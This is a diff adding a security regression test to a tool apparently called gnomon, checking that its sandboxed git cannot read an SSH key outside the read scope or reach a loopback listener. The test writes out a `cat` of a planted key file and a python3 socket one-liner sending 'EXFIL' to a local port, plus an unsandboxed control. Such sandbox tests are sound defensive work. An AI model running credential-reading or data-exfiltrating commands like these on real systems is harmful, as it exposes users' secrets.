@@ -23,9 +23,11 @@ import { mkdtempSync, writeFileSync, mkdirSync, rmSync, existsSync, readFileSync
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { createServer, type Server } from "node:http";
-import { execFileSync } from "node:child_process";
+import { execFileSync, spawn } from "node:child_process";
 import { osSandbox, _resetOsSandbox, type OsSandbox } from "gnomon-natives";
-import { executeTool, osSandboxPlan, gnomonInstallReadRoots, gnomonInstallWritable, packageIndexOf, osSandboxEnv, cleanOsSandboxTmp, type ToolContext } from "./tools.js";
+import { executeTool, osSandboxPlan, gnomonInstallReadRoots, gnomonInstallWritable, packageIndexOf, osSandboxEnv, cleanOsSandboxTmp, _resetGitSandboxScope, loadOsSandboxProbe, type ToolContext } from "./tools.js";
+import { safeGit, _gitSandboxWrap, _resetGitSafety } from "./git_safe.js";
+import { createServer as createNetServer } from "node:net";
 import { pinSandbox, applySandboxPin, describeLoosening } from "./sandbox_pin.js";
 import { EXEC_VALUES, auditSurface, resolveExec, type GnomonConfig } from "./config.js";
 import { homedir } from "node:os";
@@ -911,4 +913,70 @@ describe("second review — signals: a later call stops an earlier call's job on
       rmSync(root, { recursive: true, force: true });
     }
   }, 30_000);
+});
+
+// Third review, finding 9: gnomon's sandboxed bookkeeping git ran with reads
+// unconfined and loopback open, whatever the session's reads said. A clean
+// filter planted between the driver listing and the run (a job an earlier
+// call backgrounded) could read ~/.ssh and hand it to a listener the command
+// left on 127.0.0.1. The planted program is stood in for by `sh -c`, run
+// through exactly the wrapper gnomon's git is run through.
+describe("third review, finding 9 — gnomon's sandboxed git takes the session's read scope and no loopback", () => {
+  const why = scopedSkipWhy || netSkipWhy || (has("python3") ? "" : "no python3");
+
+  it.skipIf(!!why)(label("a program run as gnomon's git cannot read outside the scope or reach a loopback listener", why), async () => {
+    const scratch = mkdtempSync(join(tmpdir(), "gnomon-gitsbx-scope-"));
+    const root = join(scratch, "root");
+    const home = join(scratch, "home");
+    mkdirSync(root);
+    mkdirSync(join(home, ".ssh"), { recursive: true });
+    const key = join(home, ".ssh", "id_x");
+    writeFileSync(key, "FAKE-SSH-KEY-gnomon-test\n");
+    execFileSync("git", ["init", "-q"], { cwd: root });
+    writeFileSync(join(root, "a.txt"), "one\n");
+    const got: string[] = [];
+    const server = createNetServer((sock) => sock.on("data", (d) => got.push(String(d))));
+    await new Promise<void>((ok) => server.listen(0, "127.0.0.1", () => ok()));
+    const port = (server.address() as { port: number }).port;
+    _resetGitSafety();
+    _resetGitSandboxScope();
+    try {
+      const plan = osSandboxPlan("true", { root, exec: { network: false, reads: "scoped", readRoots: [] } }, "/bin/sh", await loadOsSandboxProbe());
+      expect("refusal" in plan ? plan.refusal.content : "").toBe("");
+      if (!("refusal" in plan)) cleanOsSandboxTmp(plan.file, plan.tmp, plan.tmpId);
+      const run = async (script: string) => {
+        const w = _gitSandboxWrap(["/bin/sh", "-c", script]);
+        expect(w, "gnomon's git is sandboxed after an exec = os command").not.toBeNull();
+        return new Promise<{ code: number | null; out: string }>((done) => {
+          const p = spawn(w!.file, w!.args, { cwd: root, env: w!.env });
+          let out = "";
+          p.stdout.on("data", (d) => (out += String(d)));
+          p.stderr.on("data", (d) => (out += String(d)));
+          p.on("close", (code) => done({ code, out }));
+        });
+      };
+      const read = await run(`cat '${key}'`);
+      expect(read.out, "gnomon's git read a credential outside the session's read scope").not.toContain("FAKE-SSH-KEY");
+      const send = await run(
+        `python3 -c "import socket; s = socket.create_connection(('127.0.0.1', ${port}), timeout=5); s.sendall(b'EXFIL')"`
+      );
+      await new Promise((ok) => setTimeout(ok, 200));
+      expect(got.join(""), "gnomon's git reached a loopback listener").not.toContain("EXFIL");
+      expect(send.code).not.toBe(0);
+      // The bookkeeping itself still works under that scope.
+      const st = safeGit(["status", "--porcelain"], { cwd: root });
+      expect(st.status, String(st.stderr)).toBe(0);
+      expect(st.stdout).toContain("a.txt");
+      // CONTROL: the same programs, unsandboxed, read the key and reach the listener.
+      expect(readFileSync(key, "utf8")).toContain("FAKE-SSH-KEY");
+      execFileSync("python3", ["-c", `import socket; s = socket.create_connection(('127.0.0.1', ${port}), timeout=5); s.sendall(b'CONTROL')`]);
+      await new Promise((ok) => setTimeout(ok, 200));
+      expect(got.join("")).toContain("CONTROL");
+    } finally {
+      _resetGitSafety();
+      _resetGitSandboxScope();
+      server.close();
+      rmSync(scratch, { recursive: true, force: true });
+    }
+  });
 });
